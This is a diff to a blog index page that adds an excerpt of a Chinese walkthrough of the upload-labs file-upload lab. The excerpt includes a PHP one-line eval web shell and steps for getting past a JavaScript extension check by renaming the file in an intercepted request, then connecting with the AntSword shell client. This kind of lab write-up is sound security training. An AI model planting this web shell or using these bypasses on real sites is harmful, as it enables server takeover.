@@ -164,6 +164,31 @@
       <div class="w-full">
         
           <div class="post-item group border-b border-b-hacker-color3 ">
+            <a href="/2025/05/12/upload-labs%E5%85%A8%E8%AF%A6%E8%A7%A3/" class="block py-2 px-8 group-hover:bg-hacker-hover-color space-y-4">
+              <h2 class="post-title text-hacker-color1 group-hover:text-white font-bold text-2xl">
+                upload-labs全详解
+              </h2>
+              <p class="post-meta text-hacker-color3 text-sm group-hover:text-white">
+                2025-05-12
+              </p>
+              <p class="post-excerpt text-hacker-color3 group-hover:text-white">
+                upload-1（扩展名）直接上传一句话木马
+1&amp;lt;?php @eval($_POST[&amp;#x27;cmd&amp;#x27;]);?&amp;gt;
+
+
+可知被js拦截了
+这里存在两种解法
+一.直接在浏览器中禁用js
+二.将文件名更改为cj.png，上传抓包，在重放中将文件后缀名更改为cj.php,再进行发包。
+返回靶场的页面，复制上传的文件的链接，打开蚁剑，输入上面复制的链接打开蚁剑，粘贴网址，输入密码
+
+核心的源码如下：
+12345678var allow_ext = &amp;quot;.jpg|.png|.gif&amp;quot;;    //提取上传文件的类型    var ext_name = file....
+              </p>
+            </a>
+          </div>
+        
+          <div class="post-item group border-b border-b-hacker-color3 ">
             <a href="/2025/05/04/SQL%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC/" class="block py-2 px-8 group-hover:bg-hacker-hover-color space-y-4">
               <h2 class="post-title text-hacker-color1 group-hover:text-white font-bold text-2xl">
                 SQL注入脚本
